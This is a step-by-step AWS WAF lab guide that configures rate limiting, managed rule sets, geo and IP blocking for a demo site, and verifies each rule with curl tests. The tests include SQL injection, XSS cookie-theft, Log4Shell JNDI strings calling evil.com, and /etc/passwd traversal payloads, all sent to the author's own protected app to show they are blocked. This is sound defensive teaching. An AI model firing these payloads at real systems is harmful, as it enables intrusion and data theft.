# WAF Hands-On Lab — Complete Step-by-Step Guide
## Domain: sskdevops.in

> **This guide assumes:** You have StreamFlix running on EC2 behind an ALB, and Route 53 is configured. If you don't have an ALB yet, start from Step 0.

---

## Step 0: Confirm Your Setup

Before we start WAF, verify everything is working. Run these from your laptop:

```bash
# 1. Check your EC2 is reachable via ALB
curl -s -o /dev/null -w "HTTP Code: %{http_code}\n" http://app.sskdevops.in
# Expected: HTTP Code: 200

# 2. If you're accessing via EC2 IP directly (no ALB yet), note that:
#    WAF CANNOT attach to EC2 directly. You NEED an ALB.
#    If you don't have an ALB, do Step 0A first.
```

### Step 0A: Create ALB (ONLY if you don't have one yet)

If you already have an ALB with your EC2 instances behind it, **skip to Step 1**.

**In AWS Console:**

1. **EC2** → **Load Balancers** → **Create Load Balancer** → **Application Load Balancer**
2. Fill in:
   - **Name:** `streamflix-alb`
   - **Scheme:** Internet-facing
   - **IP type:** IPv4
   - **VPC:** Select your VPC
   - **Mappings:** Check at least 2 availability zones (pick the ones your EC2s are in)

3. **Security Group:** Create new or use existing
   - Inbound: Allow HTTP (80) from `0.0.0.0/0`
   - Inbound: Allow HTTPS (443) from `0.0.0.0/0`

4. **Listeners:** HTTP:80
   - Default action: Forward to → Create target group:
     - **Target type:** Instances
     - **Name:** `streamflix-tg`
     - **Protocol/Port:** HTTP / 80
     - **Health check path:** `/health` (or `/` if you didn't set up `/health`)
   - Register your EC2 instance(s) → Include as pending

5. **Create load balancer** → Wait 2-3 min for it to become `Active`

6. **Test ALB:**
```bash
# Replace with your actual ALB DNS
curl -s -o /dev/null -w "HTTP Code: %{http_code}\n" http://streamflix-alb-XXXXXX.us-east-1.elb.amazonaws.com
# Expected: HTTP Code: 200
```

7. **Point Route 53 to ALB:**
   - Route 53 → Hosted Zones → `sskdevops.in`
   - Create Record:
     - Record name: `app`
     - Type: A
     - Alias: YES
     - Route traffic to: Application Load Balancer → your region → your ALB
   - Create Records

8. **Verify:**
```bash
curl -s -o /dev/null -w "HTTP Code: %{http_code}\n" http://app.sskdevops.in
# Expected: HTTP Code: 200
```

---

## Step 1: Create a Web ACL

This is the main WAF container that holds all your rules.

### Console Steps:

1. Open **AWS Console** → Search for **WAF & Shield** → Click **AWS WAF**
2. Make sure you're in the **correct region** (same region as your ALB, e.g., `us-east-1`)
   - If attaching to CloudFront → select **Global (CloudFront)** from the region dropdown
   - If attaching to ALB → select the **region** where your ALB lives
3. Click **Web ACLs** in the left sidebar
4. Click **Create web ACL**

### Fill in:

| Field | Value |
|-------|-------|
| **Name** | `streamflix-waf` |
| **Description** | `WAF for StreamFlix demo - sskdevops.in` |
| **Resource type** | `Regional resources` (for ALB) |
| **Region** | Same as your ALB (e.g., `US East (N. Virginia)`) |

5. **Associated AWS resources** → Click **Add AWS resources**
   - Resource type: `Application Load Balancer`
   - Select your ALB → Click **Add**

6. Click **Next**

> 🛑 **Don't add any rules yet** — we'll add them one by one in the following steps so students can see each one working.

7. **Default web ACL action for requests that don't match any rules:** Select **Allow**
8. Click **Next** → **Next** → **Next** → **Create web ACL**

### Verify WAF is attached:

```bash
# This should still return 200 — WAF is allowing everything by default
curl -s -o /dev/null -w "HTTP Code: %{http_code}\n" http://app.sskdevops.in
# Expected: HTTP Code: 200
```

*"See? WAF is attached but since default action is ALLOW and we have no rules, everything passes through."*

---

## Step 2: Add Rate Limiting Rule

**What this does:** Blocks any IP that sends more than 100 requests in 5 minutes.

### Console Steps:

1. **WAF** → **Web ACLs** → Click `streamflix-waf`
2. Click **Rules** tab → **Add rules** → **Add my own rules and rule groups**
3. Select: **Rule builder**
4. Fill in:

| Field | Value |
|-------|-------|
| **Name** | `RateLimitRule` |
| **Type** | `Rate-based rule` |
| **Rate limit** | `100` |
| **IP address to use** | `Source IP address` |
| **Action** | `Block` |

5. Click **Add rule**
6. Set **Priority** to `0` (highest priority — checked first)
7. Click **Save**

### Test — Rate Limiting Attack:

```bash
# Run this from your laptop or CloudShell
# It sends 120 requests rapidly

echo "=== RATE LIMIT TEST ==="
for i in $(seq 1 120); do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" "http://app.sskdevops.in/")
  if [ "$CODE" != "200" ]; then
    echo "Request $i: HTTP $CODE ← BLOCKED BY WAF!"
  else
    echo "Request $i: HTTP $CODE"
  fi
done
```

**Expected output:**
```
Request 1: HTTP 200
Request 2: HTTP 200
...
Request 98: HTTP 200
Request 99: HTTP 200
Request 100: HTTP 200
Request 101: HTTP 403 ← BLOCKED BY WAF!
Request 102: HTTP 403 ← BLOCKED BY WAF!
...
```

> ⚠️ **Note:** Rate limiting takes about 30-60 seconds to kick in after you hit the threshold. If you don't see 403s immediately, wait a minute and try again. The counter window is 5 minutes.

### Unblock Yourself:

After testing, you'll be blocked for up to 5 minutes. Just wait, or run tests from a different IP (like CloudShell).

### What to Tell Students:

*"We just got blocked! Our own WAF stopped us because we sent too many requests. Now imagine this was a real attacker trying to crash our server — they'd hit 403 after 100 requests and our server would be fine."*

---

## Step 3: Add SQL Injection Protection

**What this does:** Blocks requests containing SQL injection patterns.

### Console Steps:

1. **WAF** → **Web ACLs** → `streamflix-waf` → **Rules** tab
2. **Add rules** → **Add managed rule groups**
3. Expand **AWS managed rule groups** → Scroll to **SQL database**
4. Toggle **ON** `AWS-AWSManagedRulesSQLiRuleSet`
5. Click **Add rules** → Set Priority → **Save**

### Test — SQL Injection Attack:

```bash
echo "=== SQL INJECTION TESTS ==="

# Test 1: Basic SQLi in query string
echo -n "Test 1 (Basic SQLi): "
curl -s -o /dev/null -w "HTTP %{http_code}" "http://app.sskdevops.in/?id=1%27%20OR%20%271%27%3D%271"
echo ""
# The query string decodes to: ?id=1' OR '1'='1
# Expected: HTTP 403

# Test 2: UNION SELECT attack
echo -n "Test 2 (UNION SELECT): "
curl -s -o /dev/null -w "HTTP %{http_code}" "http://app.sskdevops.in/search?q=1%20UNION%20SELECT%20username%2Cpassword%20FROM%20users"
echo ""
# Decodes to: ?q=1 UNION SELECT username,password FROM users
# Expected: HTTP 403

# Test 3: Comment injection
echo -n "Test 3 (Comment injection): "
curl -s -o /dev/null -w "HTTP %{http_code}" "http://app.sskdevops.in/?user=admin%27--"
echo ""
# Decodes to: ?user=admin'--
# Expected: HTTP 403

# Test 4: Normal request (should PASS)
echo -n "Test 4 (Normal request): "
curl -s -o /dev/null -w "HTTP %{http_code}" "http://app.sskdevops.in/"
echo ""
# Expected: HTTP 200

# Test 5: Normal search (should PASS)
echo -n "Test 5 (Normal search): "
curl -s -o /dev/null -w "HTTP %{http_code}" "http://app.sskdevops.in/?search=netflix+movies"
echo ""
# Expected: HTTP 200
```

**Expected output:**
```
Test 1 (Basic SQLi): HTTP 403
Test 2 (UNION SELECT): HTTP 403
Test 3 (Comment injection): HTTP 403
Test 4 (Normal request): HTTP 200
Test 5 (Normal search): HTTP 200
```

### What to Tell Students:

*"Tests 1-3 are classic SQL injection attacks. All blocked with 403. Tests 4-5 are normal requests — they passed through. WAF is smart enough to tell the difference."*

*"Show them what `1' OR '1'='1` does to a SQL query:"*
```sql
-- Normal:
SELECT * FROM users WHERE id='123'
-- Returns: one user ✓

-- With injection:
SELECT * FROM users WHERE id='1' OR '1'='1'
-- '1'='1' is ALWAYS true
-- Returns: ALL users in the database! ✗
```

---

## Step 4: Add XSS Protection

**What this does:** Blocks requests containing JavaScript injection (cross-site scripting).

### Console Steps:

1. **WAF** → **Web ACLs** → `streamflix-waf` → **Rules** tab
2. **Add rules** → **Add managed rule groups**
3. Expand **AWS managed rule groups** → **Core rule set**
4. Toggle **ON** `AWS-AWSManagedRulesCommonRuleSet`
5. Click **Add rules** → Set Priority → **Save**

> The Common Rule Set includes XSS protection along with many other OWASP Top 10 protections.

### Test — XSS Attack:

```bash
echo "=== XSS (Cross-Site Scripting) TESTS ==="

# Test 1: Script tag in query string
echo -n "Test 1 (Script tag): "
curl -s -o /dev/null -w "HTTP %{http_code}" "http://app.sskdevops.in/?name=%3Cscript%3Ealert%28%27hacked%27%29%3C%2Fscript%3E"
echo ""
# Decodes to: ?name=<script>alert('hacked')</script>
# Expected: HTTP 403

# Test 2: Event handler XSS
echo -n "Test 2 (Event handler): "
curl -s -o /dev/null -w "HTTP %{http_code}" "http://app.sskdevops.in/?input=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E"
echo ""
# Decodes to: ?input=<img src=x onerror=alert(1)>
# Expected: HTTP 403

# Test 3: JavaScript URL scheme
echo -n "Test 3 (JS URL): "
curl -s -o /dev/null -w "HTTP %{http_code}" "http://app.sskdevops.in/?redirect=javascript:alert(document.cookie)"
echo ""
# Expected: HTTP 403

# Test 4: XSS in header
echo -n "Test 4 (XSS in Referer header): "
curl -s -o /dev/null -w "HTTP %{http_code}" -H "Referer: <script>alert('xss')</script>" "http://app.sskdevops.in/"
echo ""
# Expected: HTTP 403

# Test 5: Normal request (should PASS)
echo -n "Test 5 (Normal request): "
curl -s -o /dev/null -w "HTTP %{http_code}" "http://app.sskdevops.in/?name=Saikiran"
echo ""
# Expected: HTTP 200
```

**Expected output:**
```
Test 1 (Script tag): HTTP 403
Test 2 (Event handler): HTTP 403
Test 3 (JS URL): HTTP 403
Test 4 (XSS in Referer header): HTTP 403
Test 5 (Normal request): HTTP 200
```

### What to Tell Students:

*"XSS attacks inject JavaScript into web pages. If this script gets stored in a database and shown to other users, it runs in THEIR browser. It can steal their cookies, redirect them to fake login pages, or take over their session. WAF blocks these patterns before they even reach your application."*

---

## Step 5: Add Known Bad Inputs Protection (Log4Shell)

**What this does:** Blocks Log4Shell, Java deserialization, and other known malicious payloads.

### Console Steps:

1. **WAF** → **Web ACLs** → `streamflix-waf` → **Rules** tab
2. **Add rules** → **Add managed rule groups**
3. Expand **AWS managed rule groups** → **Known bad inputs**
4. Toggle **ON** `AWS-AWSManagedRulesKnownBadInputsRuleSet`
5. Click **Add rules** → Set Priority → **Save**

### Test — Log4Shell Attack:

```bash
echo "=== LOG4SHELL / KNOWN BAD INPUTS TESTS ==="

# Test 1: Log4Shell in User-Agent header
echo -n "Test 1 (Log4Shell in User-Agent): "
curl -s -o /dev/null -w "HTTP %{http_code}" \
  -H 'User-Agent: ${jndi:ldap://evil.com/exploit}' \
  "http://app.sskdevops.in/"
echo ""
# Expected: HTTP 403

# Test 2: Log4Shell in query string
echo -n "Test 2 (Log4Shell in query): "
curl -s -o /dev/null -w "HTTP %{http_code}" \
  "http://app.sskdevops.in/?search=%24%7Bjndi%3Aldap%3A%2F%2Fevil.com%2Fa%7D"
echo ""
# Decodes to: ?search=${jndi:ldap://evil.com/a}
# Expected: HTTP 403

# Test 3: Log4Shell in Referer header
echo -n "Test 3 (Log4Shell in Referer): "
curl -s -o /dev/null -w "HTTP %{http_code}" \
  -H 'Referer: ${jndi:ldap://evil.com/exploit}' \
  "http://app.sskdevops.in/"
echo ""
# Expected: HTTP 403

# Test 4: Normal request (should PASS)
echo -n "Test 4 (Normal request): "
curl -s -o /dev/null -w "HTTP %{http_code}" \
  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)" \
  "http://app.sskdevops.in/"
echo ""
# Expected: HTTP 200
```

**Expected output:**
```
Test 1 (Log4Shell in User-Agent): HTTP 403
Test 2 (Log4Shell in query): HTTP 403
Test 3 (Log4Shell in Referer): HTTP 403
Test 4 (Normal request): HTTP 200
```

### What to Tell Students:

*"In December 2021, Log4Shell was discovered. It affected MILLIONS of Java applications worldwide. The attacker just had to send `${jndi:ldap://evil.com/exploit}` in any HTTP header and the server would connect to the attacker's server and download malicious code. AWS updated this managed rule group within 24 hours. If you had WAF enabled, you were protected before you even heard about the vulnerability."*

---

## Step 6: Add Geo Blocking

**What this does:** Blocks all traffic from specific countries.

### Console Steps:

1. **WAF** → **Web ACLs** → `streamflix-waf` → **Rules** tab
2. **Add rules** → **Add my own rules and rule groups**
3. Select: **Rule builder**
4. Fill in:

| Field | Value |
|-------|-------|
| **Name** | `GeoBlockRule` |
| **Type** | `Regular rule` |
| **If a request** | `matches the statement` |
| **Statement** | |
| → Inspect | `Originates from a country in` |
| → Country codes | Select: `Russia (RU)`, `North Korea (KP)` — or pick any 2-3 countries |
| **Action** | `Block` |

5. Click **Add rule** → Set Priority → **Save**

### Test — Geo Blocking:

```bash
echo "=== GEO BLOCKING TEST ==="

# From your current location (India) - should PASS
echo -n "Test 1 (From India): "
curl -s -o /dev/null -w "HTTP %{http_code}" "http://app.sskdevops.in/"
echo ""
# Expected: HTTP 200 (India is not blocked)

# To truly test geo blocking, you'd need to use a VPN from a blocked country
# or test by temporarily adding India (IN) to the block list:
```

### Demo Geo Blocking for Students:

*"Since we can't easily send requests from Russia, here's how to demo it:"*

1. Go to WAF → Web ACLs → `streamflix-waf` → Rules → Edit `GeoBlockRule`
2. **Temporarily add `India (IN)` to the blocked countries**
3. Save the rule
4. Test:

```bash
# Now India is blocked
echo -n "Test (India blocked): "
curl -s -o /dev/null -w "HTTP %{http_code}" "http://app.sskdevops.in/"
echo ""
# Expected: HTTP 403 ← BLOCKED!
```

5. **IMMEDIATELY remove India from the list and save!** (Or you'll block yourself and your students)

### What to Tell Students:

*"If you're running a banking app only for Indian customers, why accept traffic from North Korea? Geo blocking reduces attack surface. It's not foolproof — attackers can use VPNs — but it eliminates a huge chunk of automated bot traffic."*

---

## Step 7: Add IP Blocking (Block Specific IPs)

**What this does:** Blocks specific IP addresses.

### Step 7A: Create an IP Set

1. **WAF** → **IP sets** (left sidebar) → **Create IP set**
2. Fill in:

| Field | Value |
|-------|-------|
| **Name** | `BlockedIPs` |
| **Region** | Same as your WAF |
| **IP version** | `IPv4` |
| **IP addresses** | Add a test IP (use your own public IP to test, then remove it!) |

3. To find your public IP:
```bash
curl -s ifconfig.me
# Example output: 49.207.xxx.xxx
```

4. Enter your IP in CIDR format: `49.207.xxx.xxx/32`
5. Click **Create IP set**

### Step 7B: Create IP Block Rule

1. **WAF** → **Web ACLs** → `streamflix-waf` → **Rules** tab
2. **Add rules** → **Add my own rules and rule groups**
3. Select: **Rule builder**
4. Fill in:

| Field | Value |
|-------|-------|
| **Name** | `IPBlockRule` |
| **Type** | `Regular rule` |
| **If a request** | `matches the statement` |
| **Statement** | |
| → Inspect | `Originates from an IP address in` |
| → IP set | Select `BlockedIPs` |
| **Action** | `Block` |

5. Click **Add rule** → Set Priority to `0` (highest) → **Save**

### Test — IP Blocking:

```bash
echo "=== IP BLOCK TEST ==="

# Test from your laptop (your IP is now blocked)
echo -n "Test (Your IP blocked): "
curl -s -o /dev/null -w "HTTP %{http_code}" "http://app.sskdevops.in/"
echo ""
# Expected: HTTP 403 ← BLOCKED!
```

### Unblock Yourself:

1. Go to **WAF** → **IP sets** → `BlockedIPs` → **Edit**
2. Remove your IP → **Save**
3. Test again:

```bash
echo -n "Test (After unblock): "
curl -s -o /dev/null -w "HTTP %{http_code}" "http://app.sskdevops.in/"
echo ""
# Expected: HTTP 200 ← Allowed again!
```

### What to Tell Students:

*"IP blocking is your emergency button. If you spot an attacker's IP in your logs, add it here immediately. But remember — sophisticated attackers rotate IPs. For persistent attacks, use rate limiting and managed rules instead."*

---

## Step 8: Add IP Whitelisting (Allow Trusted IPs ALWAYS)

**What this does:** Whitelists your office IP so it's NEVER blocked by any rule.

### Step 8A: Create IP Set for Trusted IPs

1. **WAF** → **IP sets** → **Create IP set**
2. Fill in:

| Field | Value |
|-------|-------|
| **Name** | `TrustedIPs` |
| **Region** | Same as WAF |
| **IP version** | `IPv4` |
| **IP addresses** | Your office/home IP in CIDR: `49.207.xxx.xxx/32` |

### Step 8B: Create Whitelist Rule

1. **WAF** → **Web ACLs** → `streamflix-waf` → **Rules** tab
2. **Add rules** → **Add my own rules and rule groups**
3. Select: **Rule builder**
4. Fill in:

| Field | Value |
|-------|-------|
| **Name** | `WhitelistTrustedIPs` |
| **Type** | `Regular rule` |
| **Statement** | `Originates from an IP address in` → Select `TrustedIPs` |
| **Action** | `Allow` |

5. **Set Priority to `0`** (LOWEST number = checked FIRST)
6. **Save**

### Why This Matters:

*"By giving this rule the highest priority (priority 0), it's checked BEFORE all other rules. Even if your IP triggers the rate limit or matches a managed rule, the whitelist catches it first and says ALLOW. You'll never accidentally lock yourself out."*

### Final Rule Order Should Be:

```
Priority 0: WhitelistTrustedIPs   → ALLOW (checked first!)
Priority 1: IPBlockRule           → BLOCK
Priority 2: RateLimitRule         → BLOCK
Priority 3: GeoBlockRule          → BLOCK
Priority 4: CommonRuleSet         → BLOCK
Priority 5: SQLiRuleSet           → BLOCK
Priority 6: KnownBadInputs       → BLOCK
Default:                          → ALLOW
```

---

## Step 9: Add Custom String Match Rule (Block WordPress Scanners)

**What this does:** Blocks requests trying to access WordPress admin pages (common bot traffic).

### Console Steps:

1. **WAF** → **Web ACLs** → `streamflix-waf` → **Rules** tab
2. **Add rules** → **Add my own rules and rule groups** → **Rule builder**
3. Fill in:

| Field | Value |
|-------|-------|
| **Name** | `BlockWordPressScans` |
| **Type** | `Regular rule` |
| **Statement** | |
| → Inspect | `URI path` |
| → Match type | `Contains string` |
| → String to match | `wp-admin` |
| → Text transformation | `Lowercase` |
| **Action** | `Block` |

4. **Click "Add another statement" (OR logic):**

| Field | Value |
|-------|-------|
| → Inspect | `URI path` |
| → Match type | `Contains string` |
| → String to match | `wp-login` |
| → Text transformation | `Lowercase` |

5. Change the logic to: **If a request matches AT LEAST ONE of the statements (OR)**
6. Click **Add rule** → **Save**

### Test — WordPress Scanner Blocking:

```bash
echo "=== WORDPRESS SCANNER TESTS ==="

# Test 1: wp-admin access
echo -n "Test 1 (wp-admin): "
curl -s -o /dev/null -w "HTTP %{http_code}" "http://app.sskdevops.in/wp-admin/"
echo ""
# Expected: HTTP 403

# Test 2: wp-login
echo -n "Test 2 (wp-login): "
curl -s -o /dev/null -w "HTTP %{http_code}" "http://app.sskdevops.in/wp-login.php"
echo ""
# Expected: HTTP 403

# Test 3: Normal page (should PASS)
echo -n "Test 3 (Normal page): "
curl -s -o /dev/null -w "HTTP %{http_code}" "http://app.sskdevops.in/"
echo ""
# Expected: HTTP 200
```

### What to Tell Students:

*"If you check any web server's access logs, you'll see bots scanning for `/wp-admin`, `/wp-login.php`, `/.env`, `/xmlrpc.php` constantly. If you're not running WordPress, block these paths. It reduces noise and saves compute."*

---

## Step 10: View WAF Dashboard & Sampled Requests

### Console Steps:

1. **WAF** → **Web ACLs** → `streamflix-waf`
2. Click the **Overview** tab

### What You'll See:

- **Allowed vs Blocked requests** — Graph over time
- **Top terminating rules** — Which rules blocked the most requests
- **Sampled requests** — Actual blocked requests with full details

3. Click on any sampled request to see:
   - Source IP
   - Country
   - URI path
   - Headers (User-Agent, Referer, etc.)
   - Which rule blocked it
   - The specific match details (e.g., "SQLi detected in QUERY_STRING")

### What to Tell Students:

*"This is your security dashboard. After the attack demos we just ran, you can see every blocked request here. In a real production environment, you'd review these weekly to check for false positives and spot attack patterns."*

---

## Step 11: Enable WAF Logging

### Console Steps:

1. **WAF** → **Web ACLs** → `streamflix-waf`
2. Click **Logging and metrics** tab
3. Click **Enable logging**
4. **Logging destination:** Choose one:

#### Option A: CloudWatch Logs (Easiest)
1. Select **CloudWatch Logs log group**
2. Click **Create new** → Name: `aws-waf-logs-streamflix`
   - ⚠️ The log group name MUST start with `aws-waf-logs-`
3. Select it → **Save**

#### Option B: S3 Bucket (For long-term storage)
1. Select **S3 bucket**
2. Select or create a bucket (name MUST start with `aws-waf-logs-`)
3. **Save**

### View Logs:

```bash
# If using CloudWatch Logs:
# Go to CloudWatch → Log groups → aws-waf-logs-streamflix
# You'll see log entries for every request WAF evaluated

# Generate some log entries:
curl "http://app.sskdevops.in/?id=1%27%20OR%20%271%27%3D%271"
# Wait 1-2 minutes, then check CloudWatch
```

### What to Tell Students:

*"Logging is non-negotiable in production. If you get breached, the first thing the security team asks is: 'Show us the WAF logs.' Without logs, you're flying blind."*

---

## Step 12: Set CloudWatch Alarm for Attacks

### Console Steps:

1. **CloudWatch** → **Alarms** → **Create alarm**
2. **Select metric:**
   - Browse → WAF → Per WebACL Metrics
   - Select: `BlockedRequests` for `streamflix-waf`
   - **Statistic:** Sum
   - **Period:** 5 minutes
3. **Conditions:**
   - Threshold type: Static
   - Whenever BlockedRequests is: **Greater than** `50`
4. **Actions:**
   - Create or select an SNS topic
   - Enter your email address
   - Confirm the subscription email
5. **Name:** `WAF-High-Block-Rate`
6. **Create alarm**

### Test the Alarm:

```bash
# Send enough requests to trigger blocks
for i in $(seq 1 60); do
  curl -s -o /dev/null "http://app.sskdevops.in/?id=1%27%20OR%20%271%27%3D%271"
done
echo "Sent 60 SQLi requests — check your email in 5 minutes!"
```

### What to Tell Students:

*"Now if anyone attacks sskdevops.in, you'll get an email within 5 minutes. In production, you'd also alert Slack, PagerDuty, or OpsGenie."*

---

## Step 13: Run ALL Attacks as a Final Demo

This is the big finale. Run all attacks in sequence and show the results:

```bash
#!/bin/bash
echo "╔═══════════════════════════════════════════════════════════╗"
echo "║       StreamFlix WAF Attack Demo — sskdevops.in          ║"
echo "╚═══════════════════════════════════════════════════════════╝"
echo ""

TARGET="http://app.sskdevops.in"

echo "── 1. NORMAL REQUEST ──────────────────────────────────────"
CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/")
echo "   GET /                                    → HTTP $CODE"
echo ""

echo "── 2. SQL INJECTION ───────────────────────────────────────"
CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/?id=1%27%20OR%20%271%27%3D%271")
echo "   ?id=1' OR '1'='1                         → HTTP $CODE"

CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/?q=UNION%20SELECT%20*%20FROM%20users")
echo "   ?q=UNION SELECT * FROM users             → HTTP $CODE"

CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/?user=admin%27--")
echo "   ?user=admin'--                           → HTTP $CODE"
echo ""

echo "── 3. XSS (Cross-Site Scripting) ─────────────────────────"
CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/?x=%3Cscript%3Ealert(1)%3C/script%3E")
echo "   ?x=<script>alert(1)</script>             → HTTP $CODE"

CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/?x=%3Cimg%20onerror%3Dalert(1)%3E")
echo "   ?x=<img onerror=alert(1)>                → HTTP $CODE"

CODE=$(curl -s -o /dev/null -w "%{http_code}" -H "Referer: <script>steal()</script>" "$TARGET/")
echo "   Referer: <script>steal()</script>         → HTTP $CODE"
echo ""

echo "── 4. LOG4SHELL ───────────────────────────────────────────"
CODE=$(curl -s -o /dev/null -w "%{http_code}" -H 'User-Agent: ${jndi:ldap://evil.com/a}' "$TARGET/")
echo '   User-Agent: ${jndi:ldap://evil.com/a}    → HTTP '"$CODE"

CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/?x=%24%7Bjndi%3Aldap%3A%2F%2Fevil%7D")
echo '   ?x=${jndi:ldap://evil}                   → HTTP '"$CODE"
echo ""

echo "── 5. WORDPRESS SCANNER ──────────────────────────────────"
CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/wp-admin/")
echo "   /wp-admin/                                → HTTP $CODE"

CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/wp-login.php")
echo "   /wp-login.php                             → HTTP $CODE"
echo ""

echo "── 6. PATH TRAVERSAL ─────────────────────────────────────"
CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/../../etc/passwd")
echo "   /../../etc/passwd                         → HTTP $CODE"

CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/?file=..%2F..%2Fetc%2Fpasswd")
echo "   ?file=../../etc/passwd                    → HTTP $CODE"
echo ""

echo "── 7. NO USER-AGENT (BOT) ────────────────────────────────"
CODE=$(curl -s -o /dev/null -w "%{http_code}" -H "User-Agent: " "$TARGET/")
echo "   User-Agent: (empty)                       → HTTP $CODE"
echo ""

echo "══════════════════════════════════════════════════════════"
echo "  ✅ HTTP 200 = Allowed (legitimate traffic)"
echo "  🛑 HTTP 403 = Blocked by WAF"
echo "══════════════════════════════════════════════════════════"
```

**Expected output:**
```
── 1. NORMAL REQUEST ──────────────────────────────────────
   GET /                                    → HTTP 200

── 2. SQL INJECTION ───────────────────────────────────────
   ?id=1' OR '1'='1                         → HTTP 403
   ?q=UNION SELECT * FROM users             → HTTP 403
   ?user=admin'--                           → HTTP 403

── 3. XSS (Cross-Site Scripting) ─────────────────────────
   ?x=<script>alert(1)</script>             → HTTP 403
   ?x=<img onerror=alert(1)>                → HTTP 403
   Referer: <script>steal()</script>         → HTTP 403

── 4. LOG4SHELL ───────────────────────────────────────────
   User-Agent: ${jndi:ldap://evil.com/a}    → HTTP 403
   ?x=${jndi:ldap://evil}                   → HTTP 403

── 5. WORDPRESS SCANNER ──────────────────────────────────
   /wp-admin/                                → HTTP 403
   /wp-login.php                             → HTTP 403

── 6. PATH TRAVERSAL ─────────────────────────────────────
   /../../etc/passwd                         → HTTP 403
   ?file=../../etc/passwd                    → HTTP 403

── 7. NO USER-AGENT (BOT) ────────────────────────────────
   User-Agent: (empty)                       → HTTP 403
```

---

## Cleanup After Lab

> ⚠️ **WAF costs ~$10/month if left running. Delete if you're done with the demo.**

### Delete WAF:

1. **WAF** → **Web ACLs** → `streamflix-waf`
2. **Associated resources** tab → Disassociate the ALB
3. **Delete** the Web ACL
4. **WAF** → **IP sets** → Delete `BlockedIPs` and `TrustedIPs`

### Delete CloudWatch Alarm:

1. **CloudWatch** → **Alarms** → Select `WAF-High-Block-Rate` → **Delete**

### Delete Logging:

1. **CloudWatch** → **Log groups** → Delete `aws-waf-logs-streamflix`

---

## Quick Reference: All Rules Summary

| # | Rule | Type | What It Blocks | Priority |
|---|------|------|---------------|----------|
| 1 | WhitelistTrustedIPs | Custom IP Set | Nothing (ALLOWS trusted) | 0 |
| 2 | IPBlockRule | Custom IP Set | Specific attacker IPs | 1 |
| 3 | RateLimitRule | Rate-based | >100 req/5min per IP | 2 |
| 4 | GeoBlockRule | Geo Match | Traffic from blocked countries | 3 |
| 5 | BlockWordPressScans | String Match | /wp-admin, /wp-login | 4 |
| 6 | CommonRuleSet | AWS Managed | XSS, bad bots, oversized requests | 5 |
| 7 | SQLiRuleSet | AWS Managed | SQL injection patterns | 6 |
| 8 | KnownBadInputs | AWS Managed | Log4Shell, Java exploits | 7 |
| — | Default | — | ALLOW everything else | — |
